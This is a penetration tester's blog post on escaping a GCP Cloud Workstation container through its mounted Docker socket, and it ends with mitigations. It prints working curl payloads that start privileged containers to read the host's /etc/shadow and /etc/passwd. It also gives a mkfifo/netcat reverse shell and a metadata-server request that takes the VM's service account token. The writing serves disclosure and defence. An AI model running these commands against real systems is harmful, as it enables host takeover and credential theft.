---
date: 2026-02-09
authors:
  - been
categories:
  - Cloud Security
  - GCP
tags:
  - gcp
  - cloud-workstations
  - container-escape
  - privilege-escalation
  - docker
  - pentest
description: How I broke out of a GCP Cloud Workstation container during a pentest, stole the host VM's service account token, and why Google's recommended mitigations don't actually stop the attack.
---

# Breaking Out of GCP Cloud Workstations: Docker Socket = Game Over

During a recent pentest against a GCP-heavy environment, I landed inside a Cloud Workstation. Pretty locked down at first glance — I was a regular `user` (no root), the `docker` CLI wasn't installed, and network restrictions blocked me from installing anything with `apt` or `pip`. The client thought they'd hardened it.

Within about 10 minutes, I had a root shell on the underlying Compute Engine VM and was holding the project's service account token. None of those "hardening" measures mattered.

The whole thing felt too easy, so I dug deeper. Turns out, **every single predefined Cloud Workstation image Google ships is vulnerable to this**.

<!-- more -->

## What Are Cloud Workstations?

For those who haven't encountered them yet, [Cloud Workstations](https://cloud.google.com/workstations) are Google's managed developer environments. Think "VS Code in the cloud" — your developers get a browser-based IDE backed by a container running on a GCE VM. It's clean, it's managed, and it ships with Docker support out of the box.

That last part is the problem.

## The Architecture (and Why It Matters)

Here's the stack:

- **Layer 1:** A Compute Engine VM with a GCP service account attached
- **Layer 2:** Docker/Containerd runtime
- **Layer 3:** Your workstation container (the thing you actually interact with)

To support Docker-in-Docker workflows (building images, running containers — stuff developers do every day), the workstation container gets access to `/var/run/docker.sock`. If you know anything about Docker security, you already know where this is going.

The Docker socket is root on the host. Full stop.

## The Escape

I'm going to keep this short because I wrote a [full technical walkthrough](../../cloud-security/gcp/gcp-cloud-workstations-container-breakout.md) on the wiki, but here's the situation: no root, no `docker` CLI, no internet access to install tools. Sounds tough, right?

It wasn't. The Docker socket (`/var/run/docker.sock`) was still mounted in the container. And the socket is all you need. No `docker` CLI? No problem — `curl` supports Unix sockets natively with `--unix-socket`, and it was already on the image.

Here's the full attack chain using nothing but `curl`.

### Phase 1: Recon & File Extraction

First, I created a payload to spawn a privileged container that reads sensitive files from the host:

```bash
cat <<EOF > payload_loot.json
{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "echo '---SHADOW---'; cat /mnt/host/etc/shadow; echo '---PASSWD---'; cat /mnt/host/etc/passwd"],
  "HostConfig": {
    "Binds": ["/:/mnt/host"],
    "Privileged": true,
    "NetworkMode": "host"
  },
  "Tty": false
}
EOF
```

Then created the container, started it, read the output, and cleaned up — all through the socket:

```bash
# Create the container
curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d @payload_loot.json \
  "http://localhost/containers/create?name=pwn_loot"

# Start it
curl -X POST --unix-socket /var/run/docker.sock \
  "http://localhost/containers/pwn_loot/start"

# Read the loot (/etc/shadow, /etc/passwd from the HOST)
curl --unix-socket /var/run/docker.sock \
  "http://localhost/containers/pwn_loot/logs?stdout=true&stderr=true"

# Clean up
curl -X DELETE --unix-socket /var/run/docker.sock \
  "http://localhost/containers/pwn_loot?force=true"
```

### Phase 2: Interactive Root Shell

With file extraction confirmed, I went for a full interactive shell. Set up a listener in one terminal:

```bash
nc -lvp 4444
```

Then created a reverse shell payload that connects back over localhost (works because of `NetworkMode: host`):

```bash
cat <<EOF > payload_shell.json
{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "apk add --no-cache netcat-openbsd; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 4444 > /tmp/f"],
  "HostConfig": {
    "Binds": ["/:/mnt/host"],
    "Privileged": true,
    "NetworkMode": "host"
  },
  "Tty": false
}
EOF

# Create and trigger
curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d @payload_shell.json \
  "http://localhost/containers/create?name=pwn_shell"

curl -X POST --unix-socket /var/run/docker.sock \
  "http://localhost/containers/pwn_shell/start"
```

Root shell on the VM. Game over.

### Phase 3: Post-Exploitation

From inside the popped root shell, steal the VM's identity from IMDS:

```bash
apk add curl
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

Depending on the scopes attached to that VM, you now have access to whatever that service account can touch — which in a lot of environments is way more than it should be.

## All Predefined Images Are Vulnerable

This wasn't a one-off misconfiguration by the client. I tested against the predefined image Google provides:

```
us-central1-docker.pkg.dev/cloud-workstations-images/predefined/code-oss:latest
```

Same result. Every predefined image ships with the Docker socket mounted and accessible. If your org is using Cloud Workstations with any of Google's out-of-the-box images, your developers' workstations are container escape opportunities waiting to happen.

## "Just Remove Root Access and Docker" Doesn't Work

This is the part I really want to drive home, because it's exactly the situation I was in. The client had done what most security teams would consider reasonable hardening:

1. Container runs as a non-root `user`
2. `docker` CLI removed from the image
3. Network restrictions preventing `apt`/`pip` installs

They checked all three boxes and thought they were safe. **I still escaped in minutes.**

### Why Removing Root Doesn't Help

The Docker socket (`/var/run/docker.sock`) is a Unix socket. If it's mounted into the container and the container user has read/write access to it (which they do by default via group membership), you don't need to be root to talk to it. The Docker *daemon* on the host runs as root — so any container you spawn through that socket can be privileged regardless of who asked. I was `user` the entire time. Didn't matter.

### Why Removing the Docker CLI Doesn't Help

This is the lesson the client really didn't expect. The `docker` CLI is just a convenient wrapper around the Docker Engine API. That API is exposed over the Unix socket. You can talk to it with `curl` — which supports `--unix-socket` natively and ships on every Cloud Workstation image:

```bash
# No docker CLI needed — just curl the socket directly
curl -s --unix-socket /var/run/docker.sock \
  http://localhost/containers/json
```

You can create containers, start them, exec into them — the full Docker API — without ever touching the `docker` binary. As I showed above, the entire attack chain is just a handful of `curl` commands. Removing the CLI is security theater.

### Why Network Restrictions Don't Help

The client had locked down outbound network access so I couldn't `apt install docker.io` or `pip install docker`. Smart move in general, but irrelevant here. The exploit only needs to talk to a local Unix socket — no network access required. `curl` is already on the image and `--unix-socket` talks directly to the Docker daemon. No external packages, no downloads, no egress.

### What Actually Works

You have to **remove Docker entirely** — or more precisely, **stop mounting the Docker socket into the workstation container**. No socket, no API, no escape. That's the only real fix.

If your developers need to build containers, route that through a remote builder like Cloud Build. Keep the build plane separate from the dev plane.

## The Tool

After pulling this off manually, I automated the full chain into a Python script that runs with zero external dependencies — just the standard library. It was built specifically for the constrained environment I was in: no root, no `docker` CLI, no network access, no `pip`. It talks directly to the Docker Engine API over the Unix socket, so it works even in "hardened" images.

Check it out: [gcp-workstations-containerEscapeScript](https://github.com/AI-redteam/gcp-workstations-containerEscapeScript)

Here it is in action. Left terminal: `cat /etc/shadow` denied as `user`. Right terminal: the script pulls the host's shadow file through the Docker socket without breaking a sweat.

![Exploit script extracting host /etc/shadow from inside a Cloud Workstation — permission denied as user on the left, full host shadow dump via Docker socket on the right](https://github.com/user-attachments/assets/814bbb3c-1be4-44fd-aa48-8570ad7be3e3)

Run `python3 exploit.py` from inside any Cloud Workstation with the socket mounted and it will:

1. Pull `/etc/shadow` and `/etc/passwd` from the host
2. Extract the GCP service account token from IMDS
3. Drop you into a root shell on the underlying VM

## Mitigations

If you're running Cloud Workstations in production, here's the actual fix list:

- **Stop mounting `/var/run/docker.sock`** — this is the only mitigation that fully closes the door
- **Use Cloud Build** for container builds instead of local Docker
- **Assign minimal-scope custom service accounts** to workstation configurations — don't rely on the default Compute Engine SA with `cloud-platform` scope
- **Wrap the workstation project in a VPC Service Controls perimeter** to limit blast radius even if tokens are stolen
- **Monitor IMDS access** from workstation VMs — a workstation container should never be querying the metadata service directly

## Final Thoughts

Cloud Workstations are a solid product for developer experience, but the default Docker socket exposure is a significant security gap. The fact that all predefined images ship this way means most orgs using the service are probably vulnerable right now without realizing it.

The deeper lesson here: **if you give a container access to the Docker socket, you've given it root on the host**. There's no half-measure. No amount of removing CLIs or dropping root inside the container changes that equation. The socket is the attack surface — remove it or accept the risk.

Full technical details and step-by-step walkthrough on the [wiki page](../../cloud-security/gcp/gcp-cloud-workstations-container-breakout.md).
